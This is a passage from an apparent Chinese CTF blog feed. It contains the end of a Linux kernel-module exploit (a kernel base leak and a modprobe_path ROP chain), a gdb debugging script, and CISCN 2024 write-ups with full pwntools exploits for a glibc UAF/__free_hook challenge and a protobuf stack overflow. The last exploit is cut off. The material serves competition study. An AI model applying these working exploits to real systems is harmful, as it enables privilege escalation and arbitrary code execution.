char">'\0'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>password<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_READ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">*</span>content<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>content<span class="token operator">++</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>content <span class="token operator">=</span> buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">0x20</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf[%d]: %lx\n"</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>content<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> leak1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kbase</span><span class="token class-name">size_t</span> leak2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//lkm</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> leak1<span class="token operator">-</span><span class="token number">0x713ec1</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> lkm <span class="token operator">=</span> leak2<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff = 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] lkm = 0x%lx\n"</span><span class="token punctuation">,</span> lkm<span class="token punctuation">)</span><span class="token punctuation">;</span>modprobe_path<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] modprobe_path = 0x%lx\n"</span><span class="token punctuation">,</span> modprobe_path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> target<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/tmp/xx"</span><span class="token punctuation">;</span><span class="token comment">//0xffffffff8107c550 : mov qword ptr [rdi], rsi ; jmp 0xffffffff81e02640</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>modprobe_path<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RSI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xffffffff8107c550</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>modprobe_getflag<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c7853eaab2a7f09c4eb4a8fe4a2f3804_MD5.jpeg"></p><p>动调脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>gdb <span class="token parameter variable">-q</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">""</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"file ./vmlinux"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"set \<span class="token variable">$kobase</span> = 0xffffffffc0068000"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"add-symbol-file ./rootfs/lib/modules/5.10.0-9-generic/kernel/test.ko \<span class="token variable">$kobase</span> "</span><span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"b *(\<span class="token variable">$kobase</span>+0x0000000000000282)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Emoji：暂存"><a href="#Emoji：暂存" class="headerlink" title="Emoji：暂存"></a>Emoji：暂存</h1>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024华中赛区选拔赛</title>
      <link href="/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>入围决赛，不枉此行吧</p></blockquote><p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAF，tcache 打__free_hook即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'5. exit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch，我直接把 free 这条代码删除了<br><img src="/EXP_FILE/799389c69a658f8d66246317506c0518_MD5.jpeg"></p><h1 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h1><p>就是一个protobuf的序列化，栈溢出，我直接打的one_gadget</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">protoMessage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">bytes</span> buffer <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">uint32</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> message_pb2<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phoneNumber<span class="token punctuation">,</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>name<span class="token operator">=</span>namemsg<span class="token punctuation">.</span>phoneNumber<span class="token operator">=</span>phoneNumbermsg<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span>msg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Gift: 0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token 